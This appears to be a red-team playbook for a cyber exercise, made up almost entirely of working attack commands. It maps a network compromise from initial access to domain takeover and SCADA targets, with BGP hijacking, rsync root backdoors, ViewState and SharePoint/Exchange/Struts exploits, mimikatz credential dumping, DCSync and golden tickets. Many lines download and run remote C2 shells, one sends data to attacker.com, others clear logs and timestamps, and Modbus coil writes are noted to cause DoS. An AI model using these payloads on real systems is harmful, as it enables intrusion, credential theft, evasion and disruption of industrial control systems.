# CS2020 repository

###### GROUPS
```txt
# initial entry 
1. viewstate .net box (box and user)
2. rsync dmz boxes (network only)
3. bgp hijack for creds to dmz and internal (group 2)
4. mitm dhcp6 for ipv4, arp spoof ?

# mitm greyspace
arp spoof master dns
dhcp v6 to v4
llmnr, nbtns, addns dns
rdp hijack, ssh hijack

# dmz prefix hijack
quaqqa route for 65.x.101.0/25 prefix
rogue ssh ?
master dns hijack (out of scope)
dmz dns hijack (mitm to external)
web proxy hijack (mitm gateway)
ftp hijack (rogue server creds)

# dmz boxes
rsync or ssh for access
c2 (icmp or http, ssh)
proxy (socks or http shell)
persistence (redghost, cron, immutable if root)
linenum (find suid)
prievesc (suid but not needed)
proxy (icmp, socks, or http shell)
malware (russian)
evade (clear logs, timestamps)

# external .net box (prod windows, no auth)
c2 (icmp or wmi, winrm, smb)
proxy (socks ip4 to ipv4)
host enum (seatbelt, edr, host)
persistence user (wmi, registry, fs)
net enum (bloodhound)
kerberoast spns (user to dev)
local privesc (potato svc account, user to dev)
loot memory/registry (local admin)

# pivot sharepoint (needs auth)
sharepoint cve(s)
c2 (icmp or http, wmi, winrm, smb)
proxy (socks ipv4 to ipv6)
host enum (seatbelt, edr, host)
persistence (wmi)
loot memory/registry (local admin)
net enum dev share (machine key for dev user)
local privesc (potato svc account, user to dev)
downgrade attack (user ntlm to dev)

# pivot dev windows (requires auth)
share with config (machine key)
c2 (icmp or http)
proxy (ipv6 to ipv4)
host enum 
persistence
loot registry (local admin)
domain privesc token theft (admin sql) 
domain privesc proc spoof (admin sql)
downgrade attack (admin sql)

# pivot file share (requires auth)
share with configs to dev
backups for ransomware?

# pivot sql server (no auth for report)
sql report/server cve 
sql sysadmin xp_cmdshell (from dev windows user)
c2 (icmp only)
proxy 
host enum 
persistence
loot memory/registry (hashes for privesc)
unconstrained aes and ntlm box hash
data exfil

# dcsync on dc 1
print spool (only dc1)
golden ticket 
dcysnc
c2 (socks)
proxy (no segmentation)
disable rdp svc, port forward to dev windows

# dc 2
no print spool
sysvol with shared password to (different user password for admin dev windows)
ssh key to dev linux (user)
c2 (socks)
proxy (no segmentation)

# dev linux
rsync user
ssh via dc2 
bash history root password prod linux
malware (russian)

# prod linux
ssh for access 
c2 
proxy (ssh)
password or key to ippprinter
password or key to scada linux
password or key to dev linux
malware (russian)

# ippprinter
ssh or telnet for access
default creds, cups cve, snmpset
pivot point to scada network (no segmentation)
proxy (microsocks or ssh?) 
malware (russian)?

# scada linux
rsync or ssh for access
malware (russian)?
c2 (icmp)
proxy (icmp?)

```

###### GROUP 1
```txt
# initial entry 
1. viewstate .net box (box and user)
2. rsync dmz boxes (network only)
3. struts (network only)

# dmz boxes via initial entry
fingerprinting via nmap ...
rsync or ssh for access
c2 (icmp or http, ssh)
proxy (socks or regeorge http shell)
persistence (redghost, cron, immutable if root)
linenum (find suid)
prievesc (suid but not needed)
proxy (icmp, socks, or http shell)
malware (russian fake malware? redghost)
evade (clear logs, timestamps)

# external .net box (prod windows, no auth)
fingerprinting via nmap ...
c2 (icmp or wmi, winrm, smb)
proxy (socks ip4 to ipv4 or ipv6 to ipv4)
host enum (seatbelt, edr, host)
persistence user (registry, fs)
net enum (bloodhound)
*kerberoast spns (user to dev via cracked spn) # get the dev user account, has sql creds
*local privesc (potato svc account, user to dev via com spoof) # other way for dev user account, get sql creds
loot fs/memory/registry (local admin only, machineKey doesn't match dev)

# pivot sharepoint (needs auth)
sharepoint cve(s)
c2 (icmp or http, wmi, winrm, smb)
proxy (socks ipv4 to ipv6)
host enum (seatbelt, edr, host)
admin persistence (wmi)
loot fs/memory/registry (local admin only)
*net enum dev share (net shares, machineKey in web.config for dev box)
*local privesc (potato svc account, get SYSTEM) 

# pivot dev windows (requires auth)
share with config (machineKey)
c2 (icmp or http)
proxy (ipv6 to ipv4)
host enum (seat belt, edr)
persistence (fs, reg)
loot registry (local admin)
*domain privesc token theft (admin sql account to get machine hashes) 
*domain privesc proc spoof (admin sql.. altertative)
*downgrade attack (admin sql.. other alternative)

# pivot file share (requires auth)
alternative share with configs to dev
backups with ssh keys to lin boxes
c2 (icmp or http)
proxy (ipv6 to ipv4)
host enum (seat belt, edr)
persistence (fs, reg)
loot fs (find ssh keys and machineKey for dev to get DA)

# pivot sql server (requires auth)
*sql report/server cve (sql user auth, dump machine hashes for unconstrained) 
*sql sysadmin xp_cmdshell (from dev windows user, alternative ...)
c2 (icmp only)
proxy (socks)
host enum (seatbelt, host enum)
persistence (wmi for admin, important to keep)
loot memory/registry (hashes for privesc, aes256 and ntlm hashes)
* unconstrained aes and ntlm box hash here
data exfil (sql data exfil while hitting dc with print spool attack)

# dcsync on dc 1
fingerprint rpc dump, find MSRPRN service on dc1 only (dc2 is core version, no gui!)
add spn
add dns
krbrelay ready
trigger print spool (only dc1)
extract golden ticket 
ptt to dcysnc (real objective)
c2 (icmp)
proxy (socks)
disable rdp svc, port forward to dev windows (if high speed team?)

# dc 2
no print spool
sysvol with shared password to dev user (different user but same password for admin on dev windows)
c2 (icmp)
proxy (socks)
disable winrm, change port, or port forward to dev windows (if high speed team?)

# dev linux
*rsync root user
*struts cve
loot fs (ssh keys for prod linux, shared key for multiple boxes?) 
bash history root password prod linux
malware (russian fake... redghost?)
proxy (ssh)

# prod linux
*ssh for access 
*rsync root user
c2 (http)
proxy (ssh)
loot fs (password or key to scada linux, shared password and keys to other boxes?)
malware (russian fake.. redghost?)

# ippprinter
*default creds, cups cve, snmpset
*print exploit famework, crappy shell
pivot point to scada network (no segmentation?)
proxy (microsocks or ssh?) 
malware (russian or possible)?

# scada linux
ssh for access
malware (russian or ?)
c2 (icmp?)
proxy (socks?)
persistence (redghost or malware)
```

###### BGP HIJACK
```txt
# bgp prefix hijack scenario e.g. preferred 65.x.101.0/25 over /24
# requires: https://github.com/Quagga/quagga
# 1. dmz 65.x.101.0/24 (proxy, ftp, dns, web-conf)  
# 2. zone 2a 65.x.102.0/25  (dc's, dhcp, sql, sp, web and dev)
# 3. zone 2b 65.x.102.0/25  (file, admin tools, mcafee, vuln, ?..)
# 4. zone 3 65.x.103.0/24  (workstations lin and win, printers)
# 5. zone 4a 65.x.104.0/24  (workstations, hmi, hist)
# 6. zone 4b 10.1.104.0/24  (plcs, slaves, scada)
# 7. greyspace 65.x.1.0/31 (dns, sites, opfor)

# fingerprinting for bgp, port 179   
proxychains nmap -oA dmz_fingerprinting -sT -sV --open -p873,21,22,23,53,80,179,443,873,8009,8080,8443,3306 <NETWORK/CIDR> 
proxychains nmap -oA dmz_udp_fingerprinting -sU -sV --open -p67,68,69,161,162,1194 <NETWORK/CIDR>

# vim /etc/quagga/daemons
zebra=yes
bgpd=no
ospfd=no
ospf6d=no
ripd=no
ripngd=no

# enable daemon
/etc/init.d/quagga start

# enable packet forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
echo "net.ipv4.ip_forward = 1" >> /etc/sysctl.conf

# create overlapping bgp routes (dmz example)
vtysh
show ip route bgp
conf t
router bgp 100
network 65.x.101.0/25
network 65.x.101.128/25
end
write mem

# virtual interface and static routes to intercept traffic (single box)
ifconfig lo:1 65.x.101.x/25
ip route add 65.x.101.x/32 via 0.0.0.0 dev lo:1

# mitm ssh, ftp, dns?
./fake_ssh.py
./fake_ftp.py 
./dnschef.py --fakeip <BADIP> --fakeipv6 <BADV6IP> -q
./dnschef.py --fakeip <BADIP> --fakedomains <TARGETDOMAIN> -q
./dnschef.py --nameservers <VALIDNSIP>,<VALIDNSIP> -q

# use hijacked ip to bypass pfsense?
# hijack rdp?
./seth.sh <INTERFACE> <ATTACKERIP> <RDPVICTIMIP> <GATEWAYIP> "cmd /c oneliner"

# restore traffic locally 
ifconfig lo:1 127.0.0.2
ip route del 65.x.101.x dev lo
ip route add 65.x.101.x/24 via 65.x.x.x dev ethx

# disable daemon
/etc/init.d/quagga stop
```

###### ALTERNATIVE MITM
```txt
# enable packet forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
echo "net.ipv4.ip_forward = 1" >> /etc/sysctl.conf

# dns cache poison external dns (out of scope?)
proxychains python3 poison.py <DNSIP> <FQDN> <ATTACKIP>

# arp spoof external dns, wpad.prestige1.com (out of scope?)
iptables -F;
iptables -t nat -F;
iptables -X;
iptables -t nat -A PREROUTING -p tcp -d <TARGETSERVER> --dport <PORT> -j DNAT --to-destination <ATTACKERIP>:<PORT>;
arpspoof -i eth0 -t <DNSIP> <GATEWAY>;

# ipv6 for ipv4 (dhcp in greyspace out of scope?)
mitm6.py -d <DOMAIN> -hw <TARGET>
```

###### INTERNAL / EXTERNAL RSYNC EXPLOIT
```txt
# fingerprinting for rsync, port 873 (udp with proxychains?)   
proxychains nmap -oA dmz_fingerprinting -sT -sV --open -p873,21,22,23,53,80,179,443,873,8009,8080,8443,3306 <NETWORK/CIDR> 
proxychains nmap -oA dmz_udp_fingerprinting -sU -sV --open -p67,68,69,161,162,1194 <NETWORK/CIDR>

# example rsync, list directory and files 
proxychains rsync <IP>::
proxychains rsync <IP>::files
proxychains rsync -r <IP>::files/home/

# rsync download shadow file and user folders
proxychains rsync <IP>::files/etc/shadow .
proxychains rsync -r <IP>::files/home/admin/

# create new user, upload folder
mkdir ./pwn
proxychains rsync -r ./pwn <IP>::files/home/

# generate password for shadow, append it to downloaded shadow
openssl passwd -crypt password123
echo "pwn:MjHKz4C0Z0VCI:17861:0:99999:7:::" >> ./shadow

# rsync upload shadow with updated user
proxychains rsync ./shadow <IP>::files/etc/

# download, update, upload passwd file 
rsync -R <IP>::files/etc/passwd .
echo "pwn:x:1021:1021::/home/pwn:/bin/bash" >> ./passwd
rsync ./passwd <IP>::files/etc/

# download, update, upload group file
rsync -R <IP>::files/etc/group .
echo "pwn:x:1021:" >> ./group
rsync ./group <IP>::files/etc/

# download, update, upload sudoer file
rsync -R <IP>::files/etc/sudoers .
echo "pwn ALL=(ALL) NOPASSWD:ALL" >> ./sudoers   
rsync ./sudoers <IP>::files/etc/

# connect via ssh
ssh pwn@<IP>
```

###### INTERNAL EXCHANGE EXPLOIT (requires Outlook to work)
```txt
# initial access via owa365/exchange, spray for access (or phish for NTLM hashes?)
proxychains ruler --domain <TARGET> --insecure brute --users ~/users.txt --passwords ~/passwords.txt --delay 0 --verbose

# edit /tmp/command.txt
CreateObject("Wscript.Shell").Run "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))", 0, False

# form based shells
proxychains ruler --email <USER>@<TARGET> form add --suffix superduper --input /tmp/command.txt --rule --send
```

###### EXTERNAL / INTERNAL .NET EXPLOIT
```txt
# grab viewstate info
curl -sv http:<URL>/Content/Default.aspx 2>&1|egrep "__VIEWSTATE|__VIEWSTATEENCRYPTED|__VIEWSTATEGENERATOR|__EVENTVALIDATION" > viewstate.txt &

# test case: 1 – enableviewstatemac=false and viewstateencryptionmode=false
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))"

# test case: 2 – .net < 4.5 and enableviewstatemac=true & viewstateencryptionmode=false
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <BASE64VIEWSTATE> --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=<VIEWSTATEGENERATOR> --macdecode --legacy

ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=<VIEWSTATEGENERATOR> --validationalg="SHA1" --validationkey="<VALIDATIONKEY>"

# test case: 3 – .net < 4.5 and enableviewstatemac=true/false and viewstateencryptionmode=true, remove __VIEWSTATEENCRYPTED
curl -sv 'http://<URL>/Content/default.aspx' \  
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  --data-raw '__EVENTTARGET=ddlReqType&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=<VIEWSTATEBASE64>&__VIEWSTATEGENERATOR=<VIEWSTATEGENERATOR>&__EVENTVALIDATION=<VALIDATIONBASE64>&ddlReqType=Create' 2>&1|egrep -i "validation of viewstate mac failed|may be encrypted"

# test case: 4 – .net >= 4.5 and enableviewstatemac=true/false and viewstateencryptionmode=true/false except both attribute to false
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <BASE64VIEWSTATE> --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="<DECRYPTIONKEY>"  --validationalg="SHA1" --validationkey="<VALIDATIONKEY>"

# initial access
curl -sv 'http://<URL>/Content/default.aspx' \  
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  --data-raw '__EVENTTARGET=ddlReqType&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=<URLENCODEDPAYLOAD>&__VIEWSTATEGENERATOR=<VIEWSTATEGENERATOR>&__EVENTVALIDATION=<VALIDATIONBASE64>&ddlReqType=Create' 2>&1
  
# with compromised web.configs from internal boxes (alternative)
proxychains viewgen --webconfig web.config -m <__VIEWSTATEGENERATORVALUE> -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))"
```

###### ACTIONS ON LINUX PENETRATION
```txt
# http C2
nohup curl --insecure -sv https://<IP>/c2_http_basic_server.py|python - & disown
nohup wget --no-check-certificate -q -O - https://<IP>/pwn.sh | bash & disown
# icmp C2
sysctl -w net.ipv4.icmp_echo_ignore_all=1
curl --insecure https://<IP>/icmp_basic_server -o c2_icmp_basic_server && chmod +x c2_icmp_basic_server

# proxying traffic, socks
nohup curl --insecure -sv https://<IP>/c2_python_proxy_server.py|python - & disown
ssh -f -N -D <IP>:65535 root@localhost
# proxying traffic, icmp to socks
echo 1> /proc/sys/net/ipv4/icmp_echo_ignore_all 
nohup curl --insecure -sv https://<IP>/IcmpTunnel_S.py|python - & disown
# local icmp tunnel
python IcmpTunnel_C.py <IP> <TARGETIP> <TARGETPORT>
# proxying traffic, http  
python regeorge-v2.py -l <LOCALIP> -p <LPORT> -u http://<IP>/tunnel.php

# edit proxychains.conf
localnet 127.0.0.0/255.0.0.0
socks4 <IP> <PORT> <PASSWORD>

# maintaining access, root user and SSH
# passwd root (out of scope)
adduser <c2_NAME>
usermod -aG sudo <c2_NAME>
ssh-keygen -t rsa

# post exploitation, fileless
curl --insecure -sv https://<IP>/rg-nodialog.sh| bash -
info
checkVM
escalate
sudowrap
lswrap
keyinject
cron
systimer
banip
clearlog

# post exploitation, on disk 
curl --insecure -sv https://<IP>/redghost.sh -o redghost.sh && chmod +x redghost.sh 
MassInfoGrab
SudoInject
LsInject
SSHKeyInject
# persistence
Crontab
SysTimer
# BanIP <BLUETEAMIP> # (out of scope?) 

# hide commands via path preference
curl --insecure -sv https://<IP>/bash_hide.sh -o c2_bash_hide.sh && chmod +x c2_bash_hide.sh
# hide from bash commands
# edit ~/.bashrc's:
# PATH=/bin/.usr/:${PATH}
. ./c2_bash_hide.sh && setupPwn

# lock files, keep password, encrypt 
for f in "~/.bashrc" "/bin/.usr/c2_bash_hide.sh"  "/etc/shadow" "/etc/group" "/etc/sudoers" "/root/.ssh/id_rsa*" "/<c2_NAME>/.ssh/id_rsa*"; do 
  chattr +i ${f};
done;
openssl enc -aes-256-cbc -salt -pbkdf2 -in chattr -out chattr.tmp -k <PASSWORD> & mv chattr.tmp chattr;

# clear timestamps and logs
for f in `find /var/log/ -type f -name "*" 2>/dev/null`; do
  echo "" > ${f} 2>&1> /dev/null;
done;
for f in `find / -type f -name "*" 2>/dev/null`; do
  touch ${f} 2>&1> /dev/null;
done;
history -c && echo "" > ~/.bash_history
```

###### ACTIONS ON WINDOWS PENETRATION
```txt
# on penetration
Survey 
InstallWMIPersistence <EventFilterName> <EventConsumerName>
SetFallbackNetwork <PAddress> <subnetMask>
invoke_file /tmp/socks_proxy_server.ps1
iex(new-object net.webclient).downloadstring('<URL>socks_proxy_server.ps1')

# edit proxychains.conf
socks4 <IP> <PORT>

# maintaining access from icmp c2, migrate to explorer etc..
InstallPersistence 1
InstallPersistence 2
InstallPersistence 3
GetProcess
GetProcessFull
invoke_file /tmp/InjectShellcode.ps1
msfvenom -a x64 --platform windows -p windows/x64/exec cmd="powershell \"iex(new-object net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1')\"" -f  powershell;
Inject-Shellcode -Shellcode $buff ParentID <TARGETPID> -QueueUserAPC
invoke_file /tmp/Invoke-TokenManipulation.ps1
invoke-tokenmanipulation -createprocess "cmd.exe" -username "<DOMAIN>/<USER>" processargs "/c powershell -exec bypass -noninteractive -e <BASE64>"";

# downgrade for DES hash, crack DES for NTLM
invoke_file /tmp/Get-Hash.ps1
Get-Hash
invoke-binary /tmp/InternalMonologue.exe

# credential access, hashes
invoke_file /tmp/Invoke-Kerberoast.ps1
invoke-kerberoast -domain target.local -outputformat hashcat|select hash
invoke-binary rubeus.exe triage
invoke-binary rubeus.exe dump
dll-loader -http -path http://<URL>/sharpsploit.dll; [sharpsploit.credentials.mimikatz]::logonpasswords();
invoke_file /tmp/Invoke-Mimikatz.ps1
Invoke-Mimikatz
invoke_binary Invoke-Mimikittenz.exe
proxychains GetUserSPNs.py -target-domain <TARGET> -outputfile <TARGET>_spns.txt -no-pass -hashes <HASHES> -dc-ip <DCIP) <DOMAIN/USER>

# minidumps
invoke_file /tmp/Out-Minidump.ps1
Get-Process lsass| Out-Minidump -DumpFilePath C:\temp
TimeStomp c:\temp\lsass_<PID>.dmp  "01/03/2012 12:12 pm"
download c:\temp\lsass_<PID>.dmp 
SecureDelete c:\temp\lsass_<PID>.dmp 
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonPasswords full

# lsa secrets for NTLM
invoke_file /tmp/Invoke-PowerDump.ps1
Invoke-PowerDump

# clear logs
foreach($log in (get-eventlog -list|foreach-object {$_.log})){clear-eventlog -logname $_;}

# disable and redirect rdp on dc1 (out of scope?)
DisableRDP
netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=<TARGETPORT> connectaddress=<ATTACKERTIP>

# hijack rdp, query tscon ID, create service
query user # find tscon ID, e.g. 1
sc create rdphijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#0"
net start rdphijack
```

###### DOMAIN ESCALATION
```txt
# find unconstrained delegation objects (computer scenario, sql)
proxychains findDelegation.py -no-pass -hashes <HASHES> -target-domain <DOMAIN> <DOMAIN/USERNAME>;

# dump machine NTLM hashes and aes256 key
proxychains secretsdump.py -no-pass -hashes :<NTLMHASH> -outputfile <IP>_secrets.txt <DOMAIN>/<USER>@<IP>;

# add spn via dns (SPN = HOST/PWN-<FQDNOFMACHINE>)
proxychains addspn.py -u <DOMAIN\\USER> -p <PASSWORDORHASHES> -s <SPN> --additional ldap://<DCFQDN>;

# add dns via adidns 
proxychains dnstool.py -u <DOMAIN}\\USER> -p <PASSWORDORHASHES> -r <SPN> -a add -d <ATTACKERIPADDRESS> <DCFQDN>;

# setup relay to get ticket
python krbrelayx.py -aesKey <AES256HASH>

# verify print spool on target dc
proxychains rpcdump.py -port 135 <TARGETDCFQDN>|grep "MS-RPRN";

# trigger print spool (SPN you created)
proxychains printerbug.py -hashes <HASHES> <DOMAIN/USER>@<DCFQDN> <SPN>

# export ccache to use for ptt
export KRB5CCNAME=<CACHEOFTGT>

# dump dc using tgt (use domain admin ntlm hash etc...)
proxychains secretsdump.py -outputfile <DCFQDN>_hashes -k <DCFQDN> -just-dc;
```

###### SCADA LINUX
```txt
# discover modbus
proxychains nmap -v -sT -p502 -sV -oA <NETWORK>_modbusscan --open <NETWORK/CIDR>

# initial access via brute uid
proxychains python smod.py 
> use modbus/scanner/uid
> set RHOSTS <IP>
> exploit

# enumeration, get functions
> use modbus/scanner/getfunc # or > use modbus/scanner/getfunc
> set RHOSTS <IP>
> set RPORT 502
> set UID <UID>
> exploit

# read coils
> use modbus/function/readCoils
...
> exploit

# write coil (will cause DOS!)
> use modbus/dos/writeSingleCoils
> show options
...
> exploit
```

###### PRINTERS
```txt
# discover ipprinters
proxychains pret.py
proxychains nmap -v -sT -p631 -sV -oA <NETWORK>_ippscan --open <NETWORK/CIDR>

# initial access to ipprinter, accounting bypass (CUPS CVE?)
proxychains pret.py <IP> pjl
proxychains snmpset -v1 -c public <IP> 1.3.6.1.2.1.43.5.1.1.3.1 i 6

# enumeration, generic commands etc.. 
> env
> ls ../../
> put <LFILE>
> get <RFILE>
> info config  
> info memory

# troll team display message?
> display "FUNNY MESSAGE ETC"

# loot memory, fs (sensitive data, creds, etc..)
> unlock
> nvram dump 
> get /etc/shadow

# pivot ?
> open <OTHERIP>
```

###### LATERAL MOVEMENT
```txt
# payload delivery (http, smb, webdav)
DotNetToJScript.exe -l JScript -v v4 -c TestClass p:\Shell.exe
wmic.exe process get brief /format:"https://<URL>/shell.xsl"
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://<URL>/shell.js")
cmstp.exe /ni /s https://<URL>/shell.inf
regsvr32 /s /u /i:https://<URL>/shell.sct scrobj.dll
rundll32 \\<IP>\<SHARE>\Powershdll.dll,main [system.text.encoding]::default.getstring([system.convert]::frombase64string("base64"))^|iex
rundll32 p:\PowerShdll.dll,main . { iwr -user https://<URL>/shell.ps1 }^|iex;
InstallUtil.exe /logfile= /LogToConsole=false /U PowerShdll.dll
regsvcs.exe PowerShdll.dll
regasm.exe /U PowerShdll.dll
netsh.exe add helper p:\PowerShdll.dll
wget -q -O - http://<IP>/shell.py|python -
curl -s http://<IP>/shell.py|sudo python -
curl -sv --insecure https://<IP>/shell.sh|bash -
xp_cmdshell "powershell -exec bypass -nop -noninteractive -e <PAYLOADBASE64>"

# ongoing access
proxychains wmiexec.py -nooutput -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP> "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))";
proxychains evil-winrm -i <IP> -u <USER> -H <NTLMHASH> -s ./modules -e ./modules -P 5985;Bypass-4MSI
proxychains wmiexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
proxychains dcomexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
proxychains atexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
proxychains smbexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
proxychains mssqlclient.py -windows-auth -port <PORT> -db <DB> -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<DBIP>;
proxychains secretsdump.py -no-pass -hashes :<NTLMHASH> -outputfile <IP>_secrets.txt <DOMAIN>/<USER>@<IP>;

# windows traffic redirection
netsh interface portproxy add v4tov4 listenport=<PORT> listenaddress=<IP> connectport=<TARGETPORT> connectaddress=<TARGETIP>
netsh interface portproxy delete v4tov4 listenport=<PORT> listenaddress=<IP>
netsh interface portproxy add v6tov4 listenport=<PORT> listenaddress=<IP> connectport=<TARGETPORT> connectaddress=<TARGETIP>
netsh interface portproxy delete v6tov4 listenport=<PORT> listenaddress=<IP>
netsh interface portproxy show all

# linux traffic redirection
ssh -f -N -L <IP>:<PORT>:<TARGETIP>:<TARGETPORT> <GATEWAYIP>
socat TCP-LISTEN:<PORT>,bind=<IP>,fork,reuseaddr TCP:<TARGETIP>:<TARGETPORT>
ssh -f -N -D <IP>:<PORT> root@<GATEWAYIP>
socat TCP4-LISTEN:445,fork,bind=<IP> SOCKS4:<PROXYIP>:<TARGETIP>:<TARGETPORT>,socksport=<PORT>

# host discovery andfingerprinting services (icmp proxy?)
proxychains nmap -oA NETWORK_ping_sweep -v -T 3 -PP --data "\x41\x41" -n -sn <NETWORK/CIDR>
proxychains nmap -v -T 5 -Pn -sT -sC -sV -oA NETWORK_service_fiingerprint_scan --open -p53,135,137,139,445,80,443,3389,386,636,5985,2701,1433,1961,1962 <NETWORK/CIDR>
proxychains nmap -v --script http-headers -T 3 --open -p80,443 -oA NETWORK_http_header_scan -iL <IPLIST>
proxychains nmap -v -T 5 -Pn -sT --max-rate 100 --min-rtt-timeout 100ms --max-rtt-timeout 100ms --initial-rtt-timeout 100ms --max-retries 0 -oA NETWORK_FAST_service_scan --open -p53,135,137,139,445,80,443,3389,386,636,5985,2701,1433,1961,1962 <NETWORK/CIDR>

# domain enumeration via host, using bloodhound
invoke_file /tmp/Sharphound.ps1
Invoke-BloodHound -CollectionMethod DCOnly --NoSaveCache --RandomFilenames --EncryptZip
TimeStomp c:\temp\<BLOODHOUND>.zip "01/03/2008 12:12 pm"
download c:\temp\<BLOODHOUND>.zip
SecureDelete c:\temp\<BLOODHOUND>.zip

# domain enumeration domain via host, using powershell
invoke_file /tmp/PowerView.ps1
$boxes=get-netcomputer -domain <DOMAIN> -fulldata
$boxes|%{$_|add-member -membertype noteproperty -name ipaddress -value (get-ipaddress $_.dnshostname).ipaddress -force};

# enumeration domain via proxy
proxychains bloodhound-python -c DCOnly -u <USERNAME>@<DOMAIN> --hashes <HASHES> -dc <DCIP> -gc <GCIP> -d <DOMAIN> -v;
proxychains pywerview.py get-netuser -w <DOMAIN> -u <USER> --hashes <HASHES> -t <DOMAIN> -d <DOMAIN>
proxychains pywerview.py get-netcomputer -w <DOMAIN> -u <USER> --hashes <HASHES> --full-data --ping -t <DOMAIN> -d <DOMAIN>
proxychains findDelegation.py -no-pass -hashes <HASHES> -target-domain <DOMAIN> <DOMAIN/USER>
proxychains rpcdump.py -port 135 <TARGETDC>|grep "MS-RPRN";

# file share access
mount -t cifs //<PROXYIP>/<SHARE> /mnt/share -o username=<USER>,password=<PASSWORD>,domain=<DOMAIN>,iocharset=utf8,file_mode=0777,dir_mode=0777
net share Desktop=c:\users\administrator\desktop /grant:everyone,FULL
net share Desktop /delete
net use p: \\<IP>\<SHARE>
net use p: http:\\<WEBDAVURL>
net use p: /delete

# enumerating shares via host for creds and machineKey, powershell
gci -file -filter *.config -recurse -path x:\ |%{([xml](gc $_.fullname)).selectnodes("/configuration/appSettings/add")}
gci -file -filter *.config -recurse -path x:\ |%{([xml](gc $_.fullname)).selectnodes("/configuration/connectionStrings/add")}
gci -file -filter *.config -recurse -path x:\ |%{([xml](gc $_.fullname)).selectnodes("/configuration/system.web/machineKey")}
$boxes|%{$_|add-member -membertype noteproperty -name shares -value (invoke-sharefinder -computername $_.dnshostname -excludestandard -checkshareaccess) -force};
foreach($item in $shares){$share,$desc=$item -split ' ',2;gci -file -filter *.config -path "$share"|%{([xml](gc $_.fullname)).selectnodes("configuration/appSettings/add")|where key -match pass}}

# database access
proxychains mssqlclient.py -port <PORT> -db <DB> <USER>:<PASSWORD>@<IP>
proxychains mssqlclient.py -windows-auth -no-pass -hashes :<HASH> -dc-ip <DCIP> -port <PORT> -db <DB> <DOMAIN/USER>:<PASSWORD>@<IP>

# kerberoasting, crack spns
proxychains GetNPUsers.py -outputfile <TARGET>_spns.txt -no-pass <DOMAIN/USER>
proxychains GetUserSPNs.py -target-domain <TARGET> -outputfile <TARGET>_spns.txt -no-pass -hashes <HASHES> -dc-ip <DCIP> <DOMAIN/USER>
hashcat -m 13100 -a 0 <SPNSFILE> <DICTIONARY> --force
```

###### EXPLOITS
```txt
# struts 2-59 exploit 
proxychains struts_cve-2020-0230.py -target http://<SERVER>/index.action -command 'curl --insecure -sv https://<IP>/shell.sh|bash -'

# exchange exploit
proxychains exchange_scanner_cve-2020-0688.py -s <SERVER> -u <USER> -p <PASSWORD> 
proxychains exchange_cve-2020-0688.py -s <SERVER> -u <USER> -p <PASSWORD> -c CMD "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('http://<URL>/c2_icmp_shell.ps1'))"

# sharepoint, command based payload
proxychains python sharepoint_cve-2019-0604.py -target http://<URL> -username <USER> -domain <DOMAIN> -password <PASSWORD> -version 2016 -command "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))"
proxychains python sharepoint_cve-2020-0646.py -target http://<URL> -username <USER> -domain <DOMAIN> -password <PASSWORD> -command "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))"

# sharepoint, requires editing gadget
ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))"
proxychains python sharepoint_cve-2020-1147.py -target http://<URL> -username <USER> -domain <DOMAIN> -password <PASSWORD>

# sharepoint sql report, requires editing gadget (needs testing)
